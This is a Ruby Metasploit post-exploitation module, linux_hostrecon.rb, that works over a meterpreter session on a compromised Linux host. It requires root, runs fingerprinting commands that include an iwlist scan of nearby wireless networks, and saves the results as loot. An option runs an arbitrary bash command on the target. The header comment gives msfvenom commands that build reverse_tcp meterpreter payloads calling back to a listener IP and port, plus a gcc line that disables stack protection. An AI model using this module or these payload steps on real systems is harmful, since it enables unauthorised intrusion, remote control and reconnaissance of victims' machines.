##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



##
# [ linux_hostrecon.rb - target fingerprints post-module ]
# Author: pedr0 Ubuntu [r00t-3xp10it]
# tested on: linux Kali 2.0
# P.O.C https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC[ERB]/metasploit-API/writing_a_linux_post_module_from_scratch.md
#
#
# [ POST-EXPLOITATION MODULE DESCRIPTION ]
# This module gathers target system information (linux distros), display outputs
# and stores it into a logfile in msf4/loot folder. this module also allows users
# to execute a single_command in bash + read/store outputs (advanced options).
# HINT: This module requires root privileges to run in non-Kali distros ..
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on       => set SESSION 3
# Store dumped data to msf4/loot folder?         => set STORE_LOOT true
# Agressive system fingerprints scan?            => set AGRESSIVE_DUMP true
# The bash command to execute remotly            => set SINGLE_COMMAND uname -a
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/gather/linux_hostrecon.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/gather/linux_hostrecon.rb
# Manually Path Search: root@kali:~# locate modules/post/linux/gather
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > use post/linux/gather/linux_hostrecon
# msf post(linux_hostrecon) > info
# msf post(linux_hostrecon) > show options
# msf post(linux_hostrecon) > show advanced options
# msf post(linux_hostrecon) > set [option(s)]
# msf post(linux_hostrecon) > exploit
#
#
# [ BUILD PAYLOAD ]
# msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f raw -o agent.py
# OR: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f c -o template.c
# gcc -fno-stack-protector -z execstack template.c -o agent
#
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -q -x 'reload_all'
##





#
# Module Dependencies/requires
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'



#
# Metasploit Class name and includes
#
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System



#
# Building Metasploit/Armitage info GUI/CLI
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'linux hostrecon post-module (fingeprints)',
                        'Description'   => %q{
                                        This module gathers target system information (linux distros), display outputs and stores it into a logfile in msf4/loot folder. this module also allows users to execute a single_command in bash + read/store outputs (advanced options).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                ],
 
                        'Version'        => '$Revision: 1.1',
                        'DisclosureDate' => 'set 17 2017',
                        'Platform'       => 'linux',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true',  # root privs required
                        'Targets'        =>
                                [
                                         [ 'Linux' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts Kali 2.0
                        'References'     =>
                                [
                                         [ 'URL', 'http://goo.gl/Tm44Y2' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',   # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('STORE_LOOT', [false, 'Store dumped data to msf4/loot folder?', false]),
                                OptBool.new('AGRESSIVE_DUMP', [false, 'Agressive system fingerprints scan?', false]),
                                OptString.new('SINGLE_COMMAND', [false, 'The bash command to execute remotly'])
                        ], self.class)
 
        end


#
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
#
def run
  session = client


      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("")
    print_line("    +--------------------------------------------+")
    print_line("    |     * LINUX HOST RECON (FINGERPRINT) *     |")
    print_line("    |            Author : r00t-3xp10it           |")
    print_line("    +--------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Target Architecture : #{sysnfo['Architecture']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (Linux)
    #
    unless sysinfo['OS'] =~ /Linux/ || sysinfo['OS'] =~ /linux/
      print_error("[ABORT]: This module only works againt Linux systems")
      return nil
    end
    #
    # Check if we are running in an higth integrity context (root)
    #
    unless runtor =~ /uid=0/ || runtor =~ /root/
      print_error("[ABORT]: root access is required ..")
      return nil
    end
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
    #
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ABORT]: This module only works in meterpreter sessions!")
      return nil
    end


      #
      # TODO: write better outputs ..
      # Dump system information from target system (fingerprints)
      #
      data_dump=''
      print_status("Executing list of commands remotlly ..")
      # bash commands to be executed remotlly ..
      date_out = cmd_exec("date")
      distro_uname = cmd_exec("uname -a")
      distro_release = cmd_exec("cat /etc/*-release | grep \"DISTRIB_RELEASE=\"; cat /etc/*-release | grep \"DISTRIB_DESCRIPTION=\"; cat /etc/*-release | grep \"VERSION_ID=\"; cat /etc/*-release | grep \"ID_LIKE=\"")
      distro_shells = cmd_exec("cat /etc/shells")
      # store data into a variable to write the logfile ..
      data_dump << date_out
      data_dump << ""
      data_dump << "UNAME:"
      data_dump << "----------------"
      data_dump << distro_uname
      data_dump << ""
      data_dump << "RELEASE:"
      data_dump << "----------------"
      data_dump << distro_release
      data_dump << ""
      data_dump << "AVAILABLE SHELLS:"
      data_dump << "----------------"
      data_dump << distro_shells
      data_dump << ""
      Rex::sleep(1.0)

        #
        # Agressive scan results ..
        #
        if datastore['AGRESSIVE_DUMP'] == true
          # Store interface in use (remote)
          interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
          # Executing interface scans (essids emitting)
          essid_out = cmd_exec("sudo iwlist #{interface} scanning | grep ESSID:")
          Rex::sleep(0.5)
          # store data into an variable to write the logfile ..
          data_dump << "LIST OF ESSIDs EMITING:"
          data_dump << "-----------------------"
          data_dump << essid_out
          data_dump << ""
        end

          #
          # Display results on screen ..
          #
          print_line("")
          print_line(data_dump)
          print_line("")
          Rex::sleep(0.5)

     #
     # Store data into msf loot folder (local) ..
     #
     if datastore['STORE_LOOT'] == true
       print_warning("Fingerprints stored in: ~/.msf4/loot (folder) ..")
       store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "output of linux_hostrecon")
     end

   end
end
